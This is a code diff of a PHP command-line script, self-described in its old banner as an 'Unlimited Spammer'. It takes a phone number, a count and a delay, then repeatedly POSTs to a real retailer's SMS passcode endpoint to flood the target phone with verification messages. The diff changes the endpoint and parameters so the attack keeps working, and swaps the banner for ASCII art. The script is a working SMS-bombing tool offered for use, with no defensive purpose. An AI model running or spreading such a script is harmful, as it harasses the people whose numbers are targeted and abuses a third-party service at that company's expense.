@@ -3,9 +3,9 @@ function sophie($nohp, $jum, $wait){
     $x = 0; 
     while($x < $jum) {
         $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL,"https://www.sophieparis.com/iregistration/index/resendHpValidationCode/");
+        curl_setopt($ch, CURLOPT_URL,"https://www.sophieparis.com/iregistration/ajax/sendpasscode/");
         curl_setopt($ch, CURLOPT_POST, 1);
-        curl_setopt($ch, CURLOPT_POSTFIELDS,"hp=".$nohp."");
+        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilephone=$nohp&resend=true");
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
@@ -35,21 +35,23 @@ function sophie($nohp, $jum, $wait){
  flush();
     }
 }
-print "Sadboy Spammer Messaging 
-P 
-Code by : iamexpired
-
+echo "
+ _ _                                   _              _
+(_| ) __ _ _ __ ___     _____  ___ __ (_)_ __ ___  __| |
+| |/ / _` | '_ ` _ \   / _ \ \/ / '_ \| | '__/ _ \/ _` |
+| | | (_| | | | | | | |  __/>  <| |_) | | | |  __/ (_| |_
+|_|  \__,_|_| |_| |_|  \___/_/\_\ .__/|_|_|  \___|\__,_(_)
+                                |_|
+                                
 \n";
-
-echo "SPAMMER Messaging UNLIMITED \n";
-        echo "Phone Number ? ( ex : 08xxx )\nInput : ";
+        echo "Phone Number ? ( ex : 08xxxx )\nInput : ";
         $nomor = trim(fgets(STDIN));
-        echo "Jumlah?\nInput : ";
+        echo "Amount ?\nInput : ";
         $jumlah = trim(fgets(STDIN));
-        echo "Jeda? 0-1000000000 (ex:0)\nInput : ";
+        echo "Delay ? (ex:0)\nInput : ";
         $jeda = trim(fgets(STDIN));
-        echo "Status :\n";
+        echo "Result.\n";
         $execute = sophie($nomor, $jumlah, $jeda);
         print $execute;
-        echo "/iamexpired.\n";
+        echo "iamexpired\n";
 ?>
